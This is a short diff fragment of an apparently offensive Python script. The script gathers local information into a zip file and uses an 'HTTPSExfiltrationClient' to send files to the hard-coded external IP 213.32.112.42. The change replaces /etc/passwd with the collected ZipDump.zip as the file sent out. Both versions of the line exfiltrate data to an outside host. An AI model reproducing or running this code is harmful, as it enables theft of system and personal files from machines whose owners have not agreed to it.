@@ -1269,7 +1269,7 @@ myinstanceglobal = info_search()
 myinstanceglobal.main_infosearch()
 print "[*] fichier enregistré sous collecte.zip"
 client = HTTPSExfiltrationClient(host='213.32.112.42', key="123")
-client.sendFile("/etc/passwd")
+client.sendFile("ZipDump.zip")
 client.close()
 
 
